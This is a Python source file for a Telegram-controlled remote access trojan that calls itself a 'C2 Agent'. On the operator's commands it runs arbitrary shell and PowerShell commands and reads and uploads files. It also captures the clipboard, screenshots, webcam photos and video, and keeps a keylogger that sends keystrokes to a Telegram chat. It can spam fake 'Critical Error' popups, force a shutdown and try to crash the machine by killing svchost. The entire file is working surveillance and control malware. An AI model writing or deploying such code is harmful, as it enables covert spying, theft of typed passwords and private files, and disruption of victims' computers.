#!/usr/bin/env python3

import cv2
import time
import telebot
import platform
import pyautogui
import subprocess
import threading
from pynput import keyboard
import os
import re
import json
import socket
import psutil
from datetime import datetime
from uuid import getnode as get_mac
import sys
import base64
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import ctypes
import threading

# Simple encryption functions (avoiding external dependencies issues)
def simple_encrypt(data, key):
    """Simple XOR encryption for basic protection"""
    encrypted = bytearray()
    key_bytes = key.encode('utf-8')
    for i, char in enumerate(data.encode('utf-8')):
        encrypted.append(char ^ key_bytes[i % len(key_bytes)])
    return base64.urlsafe_b64encode(encrypted).decode('utf-8')

def simple_decrypt(encrypted_data, key):
    """Simple XOR decryption"""
    try:
        encrypted_bytes = base64.urlsafe_b64decode(encrypted_data.encode('utf-8'))
        decrypted = bytearray()
        key_bytes = key.encode('utf-8')
        for i, char in enumerate(encrypted_bytes):
            decrypted.append(char ^ key_bytes[i % len(key_bytes)])
        return decrypted.decode('utf-8')
    except:
        return None

def save_encrypted_config(config, key, filename="config.enc"):
    """Save encrypted configuration"""
    try:
        encrypted = simple_encrypt(json.dumps(config), key)
        with open(filename, "w") as f:
            f.write(encrypted)
        return True
    except:
        return False

def load_encrypted_config(key, filename="config.enc"):
    """Load encrypted configuration"""
    try:
        with open(filename, "r") as f:
            encrypted_data = f.read()
        decrypted = simple_decrypt(encrypted_data, key)
        if decrypted:
            return json.loads(decrypted)
    except:
        pass
    return None

# Encryption key - use a strong password here
ENCRYPTION_PASSWORD = "YourStrongEncryptionPassword123!"  # Change this to a strong password

# Try to load encrypted config
config = load_encrypted_config(ENCRYPTION_PASSWORD)

if config:
    BOT_API_KEY = config.get("BOT_API_KEY", "")
    telegram_user_id = config.get("telegram_user_id", 0)
    KEYLOGGER_BOT_API_KEY = config.get("KEYLOGGER_BOT_API_KEY", "")
    KEYLOGGER_CHAT_ID = config.get("KEYLOGGER_CHAT_ID", "")
else:
    # Default values - replace with your actual values
    BOT_API_KEY = ""
    telegram_user_id = 0
    KEYLOGGER_BOT_API_KEY = ""
    KEYLOGGER_CHAT_ID = "0"
    
    # Save encrypted config
    config = {
        "BOT_API_KEY": BOT_API_KEY,
        "telegram_user_id": telegram_user_id,
        "KEYLOGGER_BOT_API_KEY": KEYLOGGER_BOT_API_KEY,
        "KEYLOGGER_CHAT_ID": KEYLOGGER_CHAT_ID
    }
    save_encrypted_config(config, ENCRYPTION_PASSWORD)

# Initialize bots
bot = telebot.TeleBot(BOT_API_KEY)
keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None

# Agent management
agents_file = "agents.json"
active_agents = {}
agent_counter = 1

# Keylogger variables
keylogger_active = False
keylogger_listener = None
keystroke_buffer = ""
MAX_BUFFER_LENGTH = 100
last_send_time = time.time()
SEND_INTERVAL = 60

# Prank message variables
prank_active = False
prank_thread = None

# Load agents from file
def load_agents():
    global active_agents, agent_counter
    try:
        if os.path.exists(agents_file):
            with open(agents_file, 'r') as f:
                data = json.load(f)
                active_agents = data.get('agents', {})
                agent_counter = data.get('counter', 1)
    except:
        active_agents = {}
        agent_counter = 1

# Save agents to file
def save_agents():
    try:
        with open(agents_file, 'w') as f:
            json.dump({'agents': active_agents, 'counter': agent_counter}, f)
    except:
        pass

# Get system identifier
def get_system_id():
    hostname = execute_system_command("hostname").strip()
    username = execute_system_command("whoami").strip()
    return f"{hostname}/{username}"

# Get device unique ID
def get_device_id():
    mac = ':'.join(('%012X' % get_mac())[i:i+2] for i in range(0, 12, 2))
    return mac

# Verify commands are coming from registered telegram user
def verify_telegram_id(id):
    return telegram_user_id == id

# Execute system commands
def execute_system_command(cmd):
    max_message_length = 2048
    try:
        output = subprocess.getstatusoutput(cmd)
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except:
        return "Command execution failed"

# Execute PowerShell command
def execute_powershell(cmd):
    max_message_length = 2048
    try:
        if platform.system() == "Windows":
            output = subprocess.getstatusoutput(f"powershell -Command {cmd}")
        else:
            output = subprocess.getstatusoutput(f"pwsh -Command {cmd}")
        
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except:
        return "PowerShell execution failed"

# Get clipboard contents
def get_clipboard():
    try:
        if platform.system() == "Windows":
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        else:
            # For Linux/Mac
            return execute_system_command("xclip -selection clipboard -o")
    except:
        return "Could not access clipboard"

# Prank message functions
def show_prank_message():
    """Show annoying popup messages"""
    try:
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        
        # Make window always on top
        root.attributes('-topmost', True)
        
        # Show error message
        messagebox.showerror("Critical Error", "Your system has encountered a fatal error!\n\nSystem32 files corrupted\nMemory allocation failure\n\nPlease contact system administrator immediately!")
        
        root.destroy()
    except:
        # Fallback to command line message if GUI not available
        os.system("echo Critical Error! && pause")

def continuous_prank_messages():
    """Continuously show prank messages"""
    global prank_active
    while prank_active:
        show_prank_message()
        time.sleep(2)  # Show every 2 seconds

def start_prank():
    """Start the prank message spam"""
    global prank_active, prank_thread
    
    if prank_active:
        return "Prank is already running"
    
    prank_active = True
    prank_thread = threading.Thread(target=continuous_prank_messages)
    prank_thread.daemon = True
    prank_thread.start()
    return "Prank started - user will see continuous error messages"

def stop_prank():
    """Stop the prank message spam"""
    global prank_active
    
    if not prank_active:
        return "Prank is not running"
    
    prank_active = False
    return "Prank stopped"

def crash_system():
    """Attempt to crash the system (use with caution)"""
    try:
        if platform.system() == "Windows":
            # Try to cause system instability
            os.system("taskkill /f /im svchost.exe")  # This will likely fail due to permissions
        else:
            # Linux/Mac - try to overload system
            os.system("dd if=/dev/zero of=/dev/null &")  # CPU overload
    except:
        # If privileged method fails, try to overload system with processes
        for _ in range(100):
            threading.Thread(target=lambda: os.system("echo crash")).start()

# Keylogger functions
def on_press(key):
    global keystroke_buffer, last_send_time
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.tab:
            keystroke_buffer += "\t"
        else:
            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
    except AttributeError:
        keystroke_buffer += f"[{str(key)}]"
    
    current_time = time.time()
    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or 
        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
        send_keystrokes()

def send_keystrokes():
    global keystroke_buffer, last_send_time
    
    if keystroke_buffer and keylogger_bot:
        try:
            system_id = get_system_id()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
            
            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
            keystroke_buffer = ""
            last_send_time = time.time()
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def start_keylogger():
    global keylogger_active, keylogger_listener
    
    if keylogger_active:
        return "Keylogger is already running"
    
    try:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_active = True
        
        def periodic_send():
            while keylogger_active:
                time.sleep(SEND_INTERVAL)
                send_keystrokes()
        
        threading.Thread(target=periodic_send, daemon=True).start()
        return "Keylogger started successfully"
    except Exception as e:
        return f"Failed to start keylogger: {str(e)}"

def stop_keylogger():
    global keylogger_active, keylogger_listener, keystroke_buffer
    
    if not keylogger_active:
        return "Keylogger is not running"
    
    try:
        keylogger_active = False
        if keylogger_listener:
            keylogger_listener.stop()
        
        if keystroke_buffer:
            send_keystrokes()
        
        return "Keylogger stopped successfully"
    except Exception as e:
        return f"Failed to stop keylogger: {str(e)}"

# Keylogger data cleaning functions
def apply_backspaces(s):
    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
    parts = pattern.split(s)
    out = parts[0]
    
    for seg in parts[1:]:
        if out:
            out = out[:-1]
        out += seg
    
    return out

def process_special_keys(text):
    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
    
    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
    
    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
    
    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
    
    return text

def clean_keylogger_data(text):
    text = apply_backspaces(text)
    text = process_special_keys(text)
    return text

def clean_keylog_file(input_file, output_file):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_text = f.read()
        
        cleaned_text = clean_keylogger_data(raw_text)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(cleaned_text)
        
        return f"Successfully cleaned keylog file. Output written to {output_file}"
    except Exception as e:
        return f"Error cleaning file: {str(e)}"

# Agent registration
def register_agent():
    global agent_counter
    
    device_id = get_device_id()
    system_id = get_system_id()
    ip = socket.gethostbyname(socket.gethostname())
    
    # Check if agent already exists
    for aid, agent in active_agents.items():
        if agent['device_id'] == device_id:
            agent['last_seen'] = datetime.now().isoformat()
            agent['status'] = 'online'
            save_agents()
            return aid
    
    # Register new agent
    aid = str(agent_counter)
    active_agents[aid] = {
        'device_id': device_id,
        'system_id': system_id,
        'ip': ip,
        'last_seen': datetime.now().isoformat(),
        'status': 'online'
    }
    agent_counter += 1
    save_agents()
    return aid

# Check if agent ID is valid
def is_valid_agent_id(agent_id):
    return agent_id in active_agents

# Check if this is the targeted agent
def is_target_agent(agent_id):
    return agent_id == get_device_id()

# File handling functions
def view_file_content(file_path):
    try:
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        if os.path.isdir(file_path):
            return f"Path is a directory, not a file: {file_path}"
        
        # Check file size before reading
        file_size = os.path.getsize(file_path)
        if file_size > 10 * 1024 * 1024:  # 10MB limit
            return f"File too large to view ({file_size/1024/1024:.2f} MB). Use /downloadFile instead."
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Limit content length for Telegram message
        max_length = 4000
        if len(content) > max_length:
            content = content[:max_length] + "\n\n... (truncated due to length)"
        
        return f"Contents of {file_path}:\n\n{content}"
    except Exception as e:
        return f"Error reading file: {str(e)}"

def download_file(file_path):
    try:
        if not os.path.exists(file_path):
            return None, f"File not found: {file_path}"
        
        if os.path.isdir(file_path):
            return None, f"Path is a directory, not a file: {file_path}"
        
        # Check file size
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:  # 50MB limit for Telegram
            return None, f"File too large to download ({file_size/1024/1024:.2f} MB). Max size is 50MB."
        
        return file_path, None
    except Exception as e:
        return None, f"Error accessing file: {str(e)}"

# Agent management commands
@bot.message_handler(commands=['start'])
def start_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    # Register this agent
    aid = register_agent()
    system_id = get_system_id()
    
    response = f"Agent registered with ID: {aid}\nSystem: {system_id}\n\n"
    response += "Available agents:\n"
    response += "ID  |  System\n"
    response += "-------------------\n"
    
    for aid, agent in active_agents.items():
        if agent['status'] == 'online':
            response += f"{aid}  {agent['system_id']}\n"
    
    response += f"\nTotal active agents: {len([a for a in active_agents.values() if a['status'] == 'online'])}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['scan'])
def scan_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    # This would normally scan for other agents, but for single-agent implementation
    # we just show registered agents
    response = "Available agents:\n"
    response += "ID  |  System\n"
    response += "-------------------\n"
    
    for aid, agent in active_agents.items():
        if agent['status'] == 'online':
            response += f"{aid}  {agent['system_id']}\n"
    
    response += f"\nTotal active agents: {len([a for a in active_agents.values() if a['status'] == 'online'])}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['die'])
def die_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /die <agent_id>")
        return
    
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        bot.reply_to(message, "Shutting down this agent...")
        os._exit(0)
    else:
        bot.reply_to(message, "Agent shutdown command sent (would work in multi-agent setup)")

@bot.message_handler(commands=['off'])
def off_command(message):
    if not verify_telegram_id(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /off <agent_id>")
        return

    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return

    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            # Force shutdown immediately, close apps without prompting (/f), no delay (/t 0)
            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e:
            bot.reply_to(message, f"Failed to shutdown: {e}")
            return

        active_agents[agent_id]['status'] = 'offline'
        active_agents[agent_id]['last_seen'] = datetime.now().isoformat()
        save_agents()
        bot.reply_to(message, "Agent PC is shutting down (forced).")
    else:
        bot.reply_to(message, "Shutdown command sent to agent (multi-agent setup)")

@bot.message_handler(commands=['cmd'])
def cmd_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd <agent_id> <command>")
        return
    
    agent_id = parts[1]
    command = parts[2]
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        result = execute_system_command(command)
        bot.reply_to(message, f"Command result:\n{result}")
    else:
        bot.reply_to(message, "Remote command execution (would work in multi-agent setup)")

@bot.message_handler(commands=['pow'])
def pow_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /pow <agent_id> <powershell_command>")
        return
    
    agent_id = parts[1]
    command = parts[2]
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        result = execute_powershell(command)
        bot.reply_to(message, f"PowerShell result:\n{result}")
    else:
        bot.reply_to(message, "Remote PowerShell execution (would work in multi-agent setup)")

@bot.message_handler(commands=['info'])
def info_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /info <agent_id>")
        return
    
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        system_info = f"""
System: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
Username: {execute_system_command("whoami")}
CPU: {platform.processor()}
Memory: {psutil.virtual_memory().total / (1024**3):.2f} GB
        """
        bot.reply_to(message, system_info)
    else:
        bot.reply_to(message, "Remote info request (would work in multi-agent setup)")

@bot.message_handler(commands=['clip'])
def clip_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /clip <agent_id>")
        return
    
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        clipboard = get_clipboard()
        bot.reply_to(message, f"Clipboard contents:\n{clipboard}")
    else:
        bot.reply_to(message, "Remote clipboard access (would work in multi-agent setup)")

@bot.message_handler(commands=['viewFile'])
def view_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /viewFile <agent_id> <file_path>")
        return
    
    agent_id = parts[1]
    file_path = parts[2]
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        content = view_file_content(file_path)
        bot.reply_to(message, content)
    else:
        bot.reply_to(message, "Remote file view (would work in multi-agent setup)")

@bot.message_handler(commands=['downloadFile'])
def download_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /downloadFile <agent_id> <file_path>")
        return
    
    agent_id = parts[1]
    file_path = parts[2]
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        file_path, error = download_file(file_path)
        if error:
            bot.reply_to(message, error)
        else:
            try:
                with open(file_path, 'rb') as f:
                    bot.send_document(message.chat.id, f)
                bot.reply_to(message, "File downloaded successfully")
            except Exception as e:
                bot.reply_to(message, f"Error sending file: {str(e)}")
    else:
        bot.reply_to(message, "Remote file download (would work in multi-agent setup)")

@bot.message_handler(commands=['prank'])
def prank_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /prank <agent_id> <start|stop|crash> [message]")
        return
    
    agent_id = parts[1]
    action = parts[2].lower()
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        if action == "start":
            result = start_prank()
            bot.reply_to(message, result)
        elif action == "stop":
            result = stop_prank()
            bot.reply_to(message, result)
        elif action == "crash":
            # Warning: This will crash the system!
            bot.reply_to(message, "Attempting to crash system...")
            threading.Thread(target=crash_system).start()
        else:
            bot.reply_to(message, "Unknown action. Use: start, stop, or crash")
    else:
        bot.reply_to(message, "Remote prank command (would work in multi-agent setup)")

@bot.message_handler(commands=['keylogger'])
def keylogger_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /keylogger <start|stop|status|clean> [agent_id]")
        return
    
    command = parts[1].lower()
    
    if command == "clean":
        if len(parts) != 5:
            bot.reply_to(message, "Usage: /keylogger clean <agent_id> <input_file> <output_file>")
            return
        
        agent_id = parts[2]
        if not is_valid_agent_id(agent_id):
            bot.reply_to(message, "Invalid agent ID")
            return
        
        if is_target_agent(active_agents[agent_id]['device_id']):
            input_file = parts[3]
            output_file = parts[4]
            result = clean_keylog_file(input_file, output_file)
            bot.reply_to(message, result)
        else:
            bot.reply_to(message, "Remote keylog cleaning (would work in multi-agent setup)")
    
    elif command in ["start", "stop", "status"]:
        if len(parts) != 3:
            bot.reply_to(message, f"Usage: /keylogger {command} <agent_id>")
            return
        
        agent_id = parts[2]
        if not is_valid_agent_id(agent_id):
            bot.reply_to(message, "Invalid agent ID")
            return
        
        if is_target_agent(active_agents[agent_id]['device_id']):
            if command == "start":
                result = start_keylogger()
            elif command == "stop":
                result = stop_keylogger()
            else:  # status
                status = "active" if keylogger_active else "inactive"
                result = f"Keylogger is {status}"
            bot.reply_to(message, result)
        else:
            bot.reply_to(message, f"Remote keylogger {command} (would work in multi-agent setup)")
    
    else:
        bot.reply_to(message, "Unknown command. Use: start, stop, status, or clean")

# Other commands (screenshot, webcam, etc.)
@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /screenshot <agent_id>")
        return
    
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            screenshot = pyautogui.screenshot()
            timestamp = int(time.time())
            filename = f"{timestamp}.png"
            screenshot.save(filename)
            with open(filename, "rb") as image:
                bot.send_photo(message.from_user.id, image)
            os.remove(filename)
            bot.reply_to(message, "[+] Screenshot taken")
        except Exception as e:
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote screenshot (would work in multi-agent setup)")

@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /webcam <agent_id>")
        return
    
    agent_id = parts[1]
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                timestamp = int(time.time())
                filename = f"{timestamp}.png"
                cv2.imwrite(filename, frame)
                with open(filename, "rb") as image:
                    bot.send_photo(message.from_user.id, image)
                os.remove(filename)
            cap.release()
        except Exception as e:
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote webcam (would work in multi-agent setup)")

@bot.message_handler(commands=['video'])
def video_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    parts = message.text.split(' ')
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /video <agent_id> <duration_seconds>")
        return
    
    agent_id = parts[1]
    duration = int(parts[2])
    
    if not is_valid_agent_id(agent_id):
        bot.reply_to(message, "Invalid agent ID")
        return
    
    if is_target_agent(active_agents[agent_id]['device_id']):
        try:
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = int(time.time())
            filename = f"{timestamp}.avi"
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)

            out.release()
            cap.release()

            with open(filename, "rb") as video:
                bot.send_video(message.from_user.id, video)
            os.remove(filename)
        except Exception as e:
            bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")
    else:
        bot.reply_to(message, "Remote video (would work in multi-agent setup)")

# Cleanup function
def cleanup():
    if keylogger_active and keystroke_buffer:
        send_keystrokes()
    if prank_active:
        stop_prank()

if __name__ == "__main__":
    # Load agents on startup
    load_agents()
    
    # Register this agent
    register_agent()
    
    try:
        import atexit
        atexit.register(cleanup)
        
        print("C2 Agent started. Waiting for commands...")
        bot.infinity_polling()
    except KeyboardInterrupt:
        cleanup()
        print("Exiting...")